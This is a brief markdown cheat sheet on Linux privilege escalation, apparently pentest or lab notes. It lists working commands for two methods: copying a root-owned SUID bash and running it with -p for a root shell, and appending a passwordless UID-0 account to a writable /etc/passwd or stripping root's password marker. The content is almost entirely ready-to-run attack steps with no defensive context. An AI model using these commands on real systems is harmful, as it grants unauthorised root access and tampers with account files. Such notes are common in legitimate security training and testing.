# Linux privilege escalation

## SUID binaries
If SUID bit is set on `/bin/bash` and it is owned by root user:
* `cp /bin/bash /tmp/rbash`
* `/tmp/rbash -p`

## Insecure file permissions
### Writable /etc/passwd
Add user with root privileges `echo root2::0:0:root:/root:/bin/bash >> /etc/passwd`.
Or remove password requirement on real root user by removing `x` in line for root user.
